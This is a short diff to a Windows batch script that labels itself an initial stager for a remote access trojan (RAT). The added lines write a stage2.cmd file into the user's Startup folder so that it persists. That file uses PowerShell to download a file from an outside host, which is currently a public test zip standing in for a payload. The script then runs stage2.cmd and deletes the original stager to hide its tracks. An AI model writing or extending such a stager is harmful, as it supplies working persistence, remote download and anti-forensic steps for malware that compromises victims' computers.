@@ -3,7 +3,19 @@
 @REM initial stager for RAT
 @REM created by : Luke O'Sullivan
 
+@REM variables
+set "initialPath=%cd%"
+set "STARTUP=%C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/startup%"
 @REM move into startup directory
-cd C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/startup
-@REM write payloads to startup
-(echo MsgBox "Line 1" ^& vbCrLf ^& "Line 2",262192, "Title")> popup.vbs
+cd %STARTUP%
+@REM writeS payload to startup
+(
+    echo powershell -c "Invoke-WebRequest -Uri 'ipv4.download.thinkbroadband.com/10MB.zip' -OutFile 'poc.zip'"
+)> stage2.cmd
+
+@REM run payload placeholder
+powershell ./stage2.cmd
+
+
+cd %initialPath%
+del init.cmd
